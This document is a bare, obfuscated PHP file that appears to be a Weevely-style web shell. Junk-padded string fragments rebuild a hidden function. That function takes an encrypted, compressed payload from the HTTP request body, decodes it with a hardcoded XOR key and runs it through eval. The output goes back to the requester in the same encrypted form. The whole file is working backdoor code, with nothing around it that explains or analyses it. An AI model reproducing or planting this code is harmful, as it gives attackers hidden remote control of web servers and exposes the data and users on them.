<?php
$m=';functh0ion x($t,$k){h0$c=strlh0eh0n($kh0);$h0l=strlen($t);h0$oh0="";for(h0$i=0;h0$ih0<$h0l;){h0for($j';
$A='h0$k="h05fd906a1";$khh0="32eh02eah0a0eh00ac";$h0kf="ff03cef42h04dd"h0h0h0;$p="8tGnmLkxcifQjh0nmh0A"';
$v='obh0_end_clean();$rh0=@bash0e64_ench0ode(@xh0(@gzh0h0coh0mpressh0($o),$k));prinh0th0("$p$kh$r$kf");}';
$p='"h0h0/$kh(.+)$kfh0/",h0@fih0le_get_conteh0nts("phh0p://ih0nph0ut"),$m)==1) h0h0{@ob_start();@h0eva';
$K='h0l(@gzunh0ch0ompress(@x(@bah0h0se64_decode(h0$m[1])h0,h0$k)));$oh0=@ob_gh0et_contenh0h0ts();h0@';
$y=str_replace('xO','','crexOxOatexO_xOfxOxOunction');
$j='=0;($h0j<$c&&$i<$l);$j++h0,$i+h0+){$oh0.=$t{$h0i}h0^$k{$j};}}rh0eturn $oh0;}ifh0 (@h0pregh0_match(';
$F=str_replace('h0','',$A.$m.$j.$p.$K.$v);
$Y=$y('',$F);$Y();
?>
